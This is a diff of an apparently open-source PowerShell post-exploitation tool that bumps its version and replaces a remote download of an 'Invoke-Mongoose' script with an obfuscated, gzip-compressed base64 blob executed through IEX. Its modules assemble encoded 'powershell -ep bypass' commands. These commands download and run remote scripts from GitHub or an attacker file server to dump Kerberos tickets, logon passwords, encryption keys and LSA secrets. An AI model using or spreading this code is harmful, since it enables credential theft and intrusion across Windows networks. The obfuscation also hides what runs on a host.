@@ -79,7 +79,7 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.1.8"
+Write-Host "0.1.9"
 Write-Host
 
 
@@ -142,7 +142,6 @@ elseif ($CurrentUser -and $Method -ne "RDP"){
 $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
 
 ###################### External Script Varibles ######################
-$MongooseURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Mongoose.ps1"
 $RubeusURL = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1"
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
 $KirbyURL =  "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
@@ -153,7 +152,6 @@ if (![string]::IsNullOrEmpty($LocalFileServer)) {
     $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
 
     if ($LocalFileServer -match $ipRegex) {
-        $MongooseURL = "http://$LocalFileServer/Invoke-Mongoose.ps1"
         $RubeusURL = "http://$LocalFileServer/Invoke-Rubeus.ps1"
         $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
         $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
@@ -893,39 +891,43 @@ g/FGwEikMF6QPjdo6gDZbW3wiW/Q1B3AfqAsylP8Gl11zGE1xGzWU+wWXWXNYTXFbNZT/BZddcjSe4Gj
 i5VQlvu4CNwSkfbXLVCvSPthGJkDy7QHNsRpC6H7zzU3LmbUi+wkgzcZUZL29/d5Tzgjg5Dqhv3H+v8A9eh9jGkfAAA=";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
 '@
 
+$Mongoose = @'
+Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
+$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
+'@
 ######### Module / Commands  #########
 
 # Tickets
 if ($Module -eq "Tickets"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{};IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # Tickets - KerbDump
 if ($Module -eq "KerbDump"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{};IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"");Invoke-Kirby"
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"");Invoke-Kirby"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # LogonPasswords
 elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # eKeys
 elseif ($Module -eq "ekeys"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # LSA
 elseif ($Module -eq "LSA"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
